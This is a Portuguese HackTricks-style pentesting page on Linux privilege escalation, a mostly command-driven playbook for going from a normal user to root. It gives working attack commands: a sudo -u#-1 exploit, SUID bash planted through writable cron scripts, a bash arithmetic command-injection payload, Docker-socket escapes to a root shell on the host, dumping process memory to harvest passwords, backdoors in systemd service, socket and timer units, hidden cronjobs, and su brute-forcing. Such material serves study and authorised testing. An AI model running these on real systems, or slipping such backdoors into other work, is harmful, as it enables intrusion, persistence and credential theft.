# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informações do Sistema

### Informações do SO

Vamos começar a obter informações sobre o SO em execução.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Se você **tiver permissões de escrita em qualquer diretório dentro da variável `PATH`** pode ser capaz de hijack some libraries or binaries:
```bash
echo $PATH
```
### Info do ambiente

Informações interessantes, senhas ou chaves de API nas variáveis de ambiente?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Verifique a versão do kernel e se existe algum exploit que possa ser usado para escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Você pode encontrar uma boa lista de kernels vulneráveis e alguns já **compiled exploits** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Outros sites onde você pode encontrar alguns **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extrair todas as versões de kernel vulneráveis desse site você pode fazer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Ferramentas que podem ajudar a procurar kernel exploits são:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, apenas verifica exploits para kernel 2.x)

Sempre **pesquise a versão do kernel no Google**, talvez a sua versão do kernel esteja mencionada em algum kernel exploit e assim você terá certeza de que esse exploit é válido.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versão do sudo

Com base nas versões vulneráveis do sudo que aparecem em:
```bash
searchsploit sudo
```
Você pode verificar se a versão do sudo é vulnerável usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Por @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: falha na verificação de assinatura

Consulte **smasher2 box of HTB** para um **exemplo** de como esta vuln pode ser explorada
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mais enumeração do sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar possíveis defesas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Se você estiver dentro de um docker container, pode tentar escapar dele:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Verifique **o que está montado e desmontado**, onde e por quê. Se algo estiver desmontado, você pode tentar montá-lo e verificar por informações privadas
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binários úteis
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Além disso, verifique se **any compiler is installed**. Isso é útil se você precisar usar algum kernel exploit, pois é recomendado compilá-lo na máquina onde você vai usá-lo (ou em uma semelhante).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerável Instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez exista alguma versão antiga do Nagios (por exemplo) que possa ser explorada para escalating privileges…\
Recomenda-se verificar manualmente a versão do software instalado mais suspeito.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se você tiver acesso SSH à máquina, também pode usar **openVAS** para verificar se há software instalado desatualizado e vulnerável na máquina.

> [!NOTE] > _Observe que esses comandos irão mostrar muitas informações que na maior parte serão inúteis; portanto, recomenda-se usar aplicações como OpenVAS ou similares que verifiquem se alguma versão de software instalada é vulnerável a exploits conhecidos_

## Processes

Observe quais **processos** estão sendo executados e verifique se algum processo tem **mais privilégios do que deveria** (talvez um tomcat sendo executado por root?)
```bash
ps aux
ps -ef
top -n 1
```
Sempre verifique possíveis [**electron/cef/chromium debuggers** em execução — você pode abusar disso para escalar privilégios](electron-cef-chromium-debugger-abuse.md). **Linpeas** detecta esses verificando o parâmetro `--inspect` na linha de comando do processo.\
Também **verifique seus privilégios sobre os binários dos processos**, talvez você consiga sobrescrever algum.

### Monitoramento de processos

Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorar processos. Isso pode ser muito útil para identificar processos vulneráveis sendo executados com frequência ou quando um conjunto de requisitos é atendido.

### Memória de processos

Alguns serviços de um servidor armazenam **credenciais em texto claro na memória**.\
Normalmente você precisará de **privilégios de root** para ler a memória de processos que pertencem a outros usuários; portanto, isso geralmente é mais útil quando você já é root e quer descobrir mais credenciais.\
No entanto, lembre-se de que **como usuário comum você pode ler a memória dos processos que possui**.

> [!WARNING]
> Observe que hoje em dia a maioria das máquinas **não permite ptrace por padrão**, o que significa que você não pode dumpar outros processos que pertencem ao seu usuário sem privilégios.
>
> O arquivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla a acessibilidade do ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos os processos podem ser depurados, contanto que tenham o mesmo uid. Esta é a forma clássica de funcionamento do ptrace.
> - **kernel.yama.ptrace_scope = 1**: apenas um processo pai pode ser depurado.
> - **kernel.yama.ptrace_scope = 2**: somente o administrador pode usar ptrace, pois requer a capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nenhum processo pode ser rastreado com ptrace. Uma vez definido, é necessário reiniciar para habilitar ptrace novamente.

#### GDB

Se você tiver acesso à memória de um serviço FTP (por exemplo) você poderia obter o Heap e buscar credenciais dentro dele.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para um determinado ID de processo, **maps mostram como a memória é mapeada dentro do espaço de endereçamento virtual desse processo**; também mostra as **permissões de cada região mapeada**. O pseudo-arquivo **mem** **exibe a própria memória do processo**. A partir do arquivo **maps** sabemos quais **regiões de memória são legíveis** e seus offsets. Usamos essa informação para **seek into the mem file and dump all readable regions** para um arquivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornece acesso à memória **física** do sistema, não à memória virtual. O espaço de endereçamento virtual do kernel pode ser acessado usando /dev/kmem.\
Normalmente, `/dev/mem` só é legível por **root** e pelo grupo kmem.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump é uma versão para Linux reimaginada da clássica ferramenta ProcDump da suíte Sysinternals para Windows. Obtenha em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Ferramentas

To dump a process memory you could use:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Você pode remover manualmente os requisitos de root e fazer dump do processo que pertence a você
- Script A.5 do [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root é necessário)

### Credenciais da memória do processo

#### Exemplo manual

Se você descobrir que o processo do autenticador está em execução:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Você pode dumpar o processo (veja as seções anteriores para encontrar diferentes maneiras de dumpar a memória de um processo) e procurar por credenciais dentro da memória:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

A ferramenta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) vai **roubar credenciais em texto simples da memória** e de alguns **arquivos bem conhecidos**. Requer privilégios de root para funcionar corretamente.

| Funcionalidade                                    | Nome do Processo     |
| ------------------------------------------------- | -------------------- |
| Senha do GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regexes de Busca/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tarefas agendadas/Cron jobs

Verifique se alguma tarefa agendada está vulnerável. Talvez você possa tirar proveito de um script sendo executado por root (wildcard vuln? pode modificar arquivos que root usa? usar symlinks? criar arquivos específicos no diretório que root usa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Por exemplo, dentro de _/etc/crontab_ você pode encontrar o PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observe como o usuário "user" tem permissões de escrita sobre /home/user_)

Se, dentro deste crontab, o usuário root tentar executar algum comando ou script sem definir o PATH. Por exemplo: _\* \* \* \* root overwrite.sh_\
Então, você pode obter uma root shell usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando um script com um wildcard (Wildcard Injection)

Se um script é executado por root e possui um “**\***” dentro de um comando, você pode explorar isso para causar comportamentos inesperados (como privesc). Exemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se o wildcard for precedido por um caminho como** _**/some/path/\***_ **, não é vulnerável (nem** _**./\***_ **é).**

Leia a seguinte página para mais truques de exploração de wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

O Bash executa parameter expansion e command substitution antes da avaliação aritmética em ((...)), $((...)) e let. Se um root cron/parser lê campos de log não confiáveis e os passa para um contexto aritmético, um atacante pode injetar um command substitution $(...) que será executado como root quando o cron rodar.

- Por que funciona: No Bash, as expansões ocorrem nesta ordem: parameter/variable expansion, command substitution, arithmetic expansion, depois word splitting e pathname expansion. Assim, um valor como `$(/bin/bash -c 'id > /tmp/pwn')0` é primeiro substituído (executando o comando), então o `0` numérico restante é usado na aritmética para que o script continue sem erros.

- Padrão vulnerável típico:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploração: Faça com que texto controlado pelo atacante seja gravado no log analisado de forma que o campo com aparência numérica contenha um command substitution e termine com um dígito. Garanta que seu comando não escreva para stdout (ou redirecione-o) para que a aritmética permaneça válida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se o script executado pelo root usa um **diretório ao qual você tem acesso total**, talvez seja útil deletar esse diretório e **criar um symlink para outro diretório** que sirva um script controlado por você
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs frequentes

Você pode monitorar os processos para procurar por processos que estão sendo executados a cada 1, 2 ou 5 minutos. Talvez você consiga tirar proveito disso e escalate privileges.

Por exemplo, para **monitorar a cada 0.1s durante 1 minuto**, **ordenar pelos comandos menos executados** e apagar os comandos que foram executados com mais frequência, você pode fazer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Você também pode usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (isso irá monitorar e listar todos os processos que forem iniciados).

### Cronjobs invisíveis

É possível criar um cronjob **colocando um retorno de carro após um comentário** (sem o caractere de nova linha), e o cronjob funcionará. Exemplo (observe o caractere de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Serviços

### Arquivos _.service_ graváveis

Verifique se você pode escrever algum arquivo `.service`; se puder, você **poderia modificá-lo** para que ele **execute** seu **backdoor quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez você precise aguardar até que a máquina seja reiniciada).\
Por exemplo, crie seu backdoor dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**

### Binários de serviço graváveis

Tenha em mente que se você tem **permissões de escrita sobre binários sendo executados por serviços**, você pode alterá-los para backdoors de modo que quando os serviços forem re-executados os backdoors sejam executados.

### systemd PATH - Caminhos relativos

Você pode ver o PATH usado pelo **systemd** com:
```bash
systemctl show-environment
```
Se você descobrir que pode **escrever** em qualquer uma das pastas do caminho, pode ser capaz de **escalar privilégios**. Você precisa procurar por **caminhos relativos sendo usados em arquivos de configuração de serviços** como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Então, crie um **executável** com o **mesmo nome do binário de caminho relativo** dentro da pasta systemd PATH que você pode escrever, e quando o serviço for solicitado a executar a ação vulnerável (**Start**, **Stop**, **Reload**), seu **backdoor será executado** (usuários não privilegiados normalmente não podem iniciar/parar serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Timers**

**Timers** são arquivos de unidade do systemd cujo nome termina em `**.timer**` que controlam `**.service**` files or events. **Timers** podem ser usados como uma alternativa ao cron, pois têm suporte embutido para eventos de tempo de calendário e eventos de tempo monotônico e podem ser executados assincronamente.

Você pode enumerar todos os timers com:
```bash
systemctl list-timers --all
```
### Temporizadores graváveis

Se você conseguir modificar um temporizador, pode fazê-lo executar algumas unidades do systemd.unit (como uma `.service` ou uma `.target`).
```bash
Unit=backdoor.service
```
Na documentação você pode ler o que é a Unit:

> A unidade a ativar quando este timer expira. O argumento é um nome de unidade, cujo sufixo não é ".timer". Se não for especificado, este valor padrão é um serviço que tem o mesmo nome da unidade timer, exceto pelo sufixo. (Veja acima.) Recomenda-se que o nome da unidade ativada e o nome da unidade do timer sejam idênticos, exceto pelo sufixo.

Portanto, para abusar desta permissão você precisaria:

- Encontrar alguma unit do systemd (como um `.service`) que esteja **executando um binário gravável**
- Encontrar alguma unit do systemd que esteja **executando um caminho relativo** e você tenha **privilégios de escrita** sobre o **systemd PATH** (para se passar por esse executável)

**Saiba mais sobre timers com `man systemd.timer`.**

### **Habilitar Timer**

Para habilitar um timer você precisa de privilégios root e executar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note que o **timer** é **ativado** criando um symlink para ele em `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permitem a **comunicação entre processos** na mesma máquina ou em máquinas diferentes dentro de modelos cliente-servidor. Eles utilizam arquivos de descritor Unix padrão para comunicação entre computadores e são configurados através de arquivos `.socket`.

Sockets podem ser configurados usando arquivos `.socket`.

**Saiba mais sobre sockets com `man systemd.socket`.** Dentro deste arquivo, vários parâmetros interessantes podem ser configurados:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas um resumo é usado para **indicar onde ele vai escutar** o socket (o caminho do arquivo de socket AF_UNIX, o IPv4/6 e/ou número de porta a escutar, etc.)
- `Accept`: Recebe um argumento booleano. Se **true**, uma **instância de service é gerada para cada conexão entrante** e apenas o socket da conexão é passado para ela. Se **false**, todos os sockets de escuta são **passados para a service unit iniciada**, e apenas uma service unit é instanciada para todas as conexões. Esse valor é ignorado para datagram sockets e FIFOs, onde uma única service unit trata incondicionalmente todo o tráfego de entrada. **Padrão: false**. Por razões de desempenho, recomenda-se implementar novos daemons apenas de forma compatível com `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Aceita uma ou mais linhas de comando, que são **executadas antes** ou **depois** que os **sockets**/FIFOs de escuta sejam **criadas** e vinculadas, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido pelos argumentos do processo.
- `ExecStopPre`, `ExecStopPost`: Comandos adicionais que são **executados antes** ou **depois** que os **sockets**/FIFOs de escuta sejam **fechados** e removidos, respectivamente.
- `Service`: Especifica o nome da **service** unit a **ativar** em caso de **tráfego de entrada**. Esta configuração só é permitida para sockets com Accept=no. Por padrão, aponta para a service que tem o mesmo nome do socket (com o sufixo substituído). Na maioria dos casos, não deve ser necessário usar essa opção.

### Arquivos .socket graváveis

Se você encontrar um arquivo `.socket` **gravável**, você pode **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` e a backdoor será executada antes do socket ser criado. Portanto, você **provavelmente precisará esperar até que a máquina seja reiniciada.**\
_Observe que o sistema precisa estar usando essa configuração de arquivo socket ou a backdoor não será executada_

### Sockets graváveis

Se você **identificar algum socket gravável** (_agora estamos falando de Unix Sockets e não dos arquivos de configuração `.socket`_), então **você pode se comunicar** com esse socket e talvez explorar uma vulnerabilidade.

### Enumerar Unix Sockets
```bash
netstat -a -p --unix
```
### Conexão raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemplo de exploração:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Note que podem existir alguns **sockets escutando requisições HTTP** (_Não estou falando dos arquivos .socket mas dos arquivos que atuam como unix sockets_). Você pode verificar isso com:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se o socket **responder com uma requisição HTTP**, então você pode **se comunicar** com ele e talvez **explorar alguma vulnerabilidade**.

### Socket do Docker com permissão de escrita

O socket do Docker, frequentemente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele é gravável pelo usuário `root` e pelos membros do grupo `docker`. Possuir acesso de escrita a esse socket pode levar à elevação de privilégios. Abaixo está uma explicação de como isso pode ser feito e métodos alternativos caso o Docker CLI não esteja disponível.

#### **Privilege Escalation with Docker CLI**

Se você tem acesso de escrita ao socket do Docker, pode escalar privilégios usando os seguintes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Estas commands allow you to run a container with root-level access to the host's file system.

#### **Usando Docker API Diretamente**

Em casos onde o Docker CLI não está disponível, o docker socket ainda pode ser manipulado usando a Docker API e comandos `curl`.

1.  **List Docker Images:** Recupera a lista de imagens disponíveis.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envia uma requisição para criar um container que monta o diretório raiz do host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Inicie o container recém-criado:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` para estabelecer uma conexão com o container, permitindo a execução de comandos dentro dele.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Após configurar a conexão `socat`, você pode executar comandos diretamente no container com acesso root ao sistema de arquivos do host.

### Outros

Note que se você tem permissões de escrita sobre o docker socket porque você está **dentro do grupo `docker`** você tem [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Se a [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Confira **mais maneiras de escapar do docker ou abusá-lo para escalar privilégios** em:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus é um sofisticado sistema de **Comunicação entre Processos (IPC)** que permite que aplicações interajam e compartilhem dados de forma eficiente. Projetado para o sistema Linux moderno, fornece uma estrutura robusta para diferentes formas de comunicação entre aplicações.

O sistema é versátil, suportando IPC básico que melhora a troca de dados entre processos, de forma semelhante a sockets de domínio UNIX aprimorados. Além disso, ajuda na transmissão de eventos ou sinais, promovendo integração entre componentes do sistema. Por exemplo, um sinal de um daemon Bluetooth sobre uma chamada recebida pode instruir um player de música a silenciar, melhorando a experiência do usuário. Adicionalmente, o D-Bus suporta um sistema de objetos remotos, simplificando requisições de serviço e invocações de métodos entre aplicações, agilizando processos que tradicionalmente eram complexos.

D-Bus opera sobre um **allow/deny model**, gerenciando permissões de mensagem (chamadas de método, emissões de sinal, etc.) com base no efeito cumulativo de regras de política que batem. Essas políticas especificam as interações com o bus, potencialmente permitindo elevação de privilégios através da exploração dessas permissões.

Um exemplo de tal política em `/etc/dbus-1/system.d/wpa_supplicant.conf` é fornecido, detalhando permissões para o usuário root possuir, enviar e receber mensagens de `fi.w1.wpa_supplicant1`.

Políticas sem um usuário ou grupo especificado se aplicam universalmente, enquanto políticas de contexto "default" se aplicam a todos não cobertos por outras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprenda a enumerar e explorar uma comunicação D-Bus aqui:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rede**

Sempre é interessante enumerar a rede e determinar a posição da máquina.

### Enumeração genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Portas abertas

Sempre verifique os serviços de rede em execução na máquina com os quais você não pôde interagir antes de acessá-la:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifique se você consegue sniff traffic. Se conseguir, poderá ser capaz de capturar algumas credentials.
```
timeout 1 tcpdump
```
## Usuários

### Enumeração Genérica

Verifique **quem** você é, quais **privilégios** você tem, quais **usuários** estão nos sistemas, quais podem fazer **login** e quais têm **privilégios de root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Algumas versões do Linux foram afetadas por um bug que permite a usuários com **UID > INT_MAX** escalarem privilégios. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupos

Verifique se você é **membro de algum grupo** que poderia conceder privilégios de root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Área de transferência

Verifique se há algo interessante na área de transferência (se possível)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Senhas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Senhas conhecidas

Se você **conhecer qualquer senha** do ambiente, **tente fazer login como cada usuário** usando essa senha.

### Su Brute

Se você não se importar em gerar muito ruído e os binários `su` e `timeout` estiverem presentes na máquina, você pode tentar brute-forcear usuários usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
